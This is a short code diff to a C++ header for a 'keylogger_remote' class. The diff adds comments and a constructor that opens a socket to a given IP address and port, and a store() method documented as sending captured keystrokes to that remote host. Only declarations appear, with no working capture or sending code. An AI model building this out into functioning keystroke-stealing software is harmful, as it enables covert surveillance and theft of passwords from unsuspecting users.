@@ -8,16 +8,29 @@ using namespace std;
 class keylogger_remote : virtual public keylogger
 {
     private:
-		SOCKET a_socket;
+      SOCKET a_socket;
 
     public:
-		keylogger_remote();
 
-		virtual void initialize(string, int);
+      /*
+  		* Constructor with parameters
+  		*
+  		* Open attribute a_socket with p_ip_address and p_port
+  		*
+  		* p_ip_address :  adress ip where send the entry
+      * p_port : port to use
+  		*/
+  		keylogger_remote(string p_ipd_address, int p_port);
 
-		virtual ~keylogger_remote();
+      /*
+      * Destructor
+      */
+  		virtual ~keylogger_remote();
 
-		virtual void save();
-};
+      /*
+      * Store data by sending them to a_socket
+      */
+  		virtual void store();
+  };
 
 #endif
